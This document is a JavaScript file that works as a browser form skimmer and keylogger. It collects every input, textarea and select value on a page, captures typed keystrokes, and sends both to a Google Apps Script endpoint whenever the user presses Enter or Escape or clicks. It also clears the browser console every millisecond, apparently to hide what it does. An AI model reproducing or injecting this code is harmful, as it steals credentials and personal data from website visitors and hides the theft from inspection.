//CODE1-START---------------------------------------------------------------------------------------------
var inputs, index, result1, str;
inputs = document.querySelectorAll('input,textarea,select');
str = "Value1 Of USER Has " + inputs.length + " INLETS : [[--";
for (index = 0; index < inputs.length; ++index) {
    str = str + " (" + inputs[index].tagName + " => " + inputs[index].value + ") --";
    result1 = str + "]] ";
}
params1 = result1 + " -- From [[" + window.location.href + "]] AT [[" + new Date() + "]]";
sendparams1(params1);
//CODE1-END-----------------------------------------------------------------------------------------------

//CODE2-START---------------------------------------------------------------------------------------------
var keyed, keyvalue;
document.addEventListener("keyup", function (e) {//DATA
    keyed = keyed + e.key;
    keyvalue = keyed;
});
document.addEventListener("keypress", function (e) {//ENTER-KEY
    if (e.key === 'Enter') {
        if (keyvalue) {
            params = keyvalue;
            sendparams(params);
            keyed = "";
            keyvalue = "";
            params = "";
        }
    }
});
document.addEventListener('keydown', function (e) {//ESCAPE-KEY
    if (e.key === 'Escape') {
        if (keyvalue) {
            params = keyvalue;
            sendparams(params);
            keyed = "";
            keyvalue = "";
            params = "";
        }
    }
});
document.addEventListener("click", function (e) {//CLICK
    if (keyvalue) {
        params = keyvalue;
        sendparams(params);
        keyed = "";
        keyvalue = "";
        params = "";
    }
});
//CODE2-END----------------------------------------------------------------------------------------------

//CODE-ENGINE-START--------------------------------------------------------------------------------------
//FAKE EXAMPLE OF A <<GOOGLE SCRIPT-PROJECT LINK>> : https://script.google.com/macros/s/AKfycbwSGuUu3lxTrDuCwAaMvVYnWTQWMx6PkOiLze-OVtg-tCUuZgyD_UM8-AKiEiLUmP4Z/exec
function sendparams1(params1) {
    var url = "https://script.google.com/macros/s/AKfycbwSGuUu3lxTrDuCwAaMvVYnWTQWMx6PkOiLze-OVtg-tCUuZgyD_UM8-AKiEiLUmP4Z/exec";
    var f = params1;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url);
    //xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
        }
    };
    var data = `{"first": "${f}","second": "NULL"}`;
    xhr.send(data);
}

function sendparams(params) {
    var url = "https://script.google.com/macros/s/AKfycbwSGuUu3lxTrDuCwAaMvVYnWTQWMx6PkOiLze-OVtg-tCUuZgyD_UM8-AKiEiLUmP4Z/exec";
    var s = params;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url);
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
        }
    };
    var data = `{"first": "NULL","second": "${s}"}`;
    xhr.send(data);
}
//CODE-ENGINE-END-----------------------------------------------------------------------------------------

//CODE-CONSOLE-CLEAR-START-----------------------------------------------------------------------------------------
setInterval(() => {
    console.clear();
}, 1);
//CODE-CONSOLE-CLEAR-END-------------------------------------------------------------------------------------------
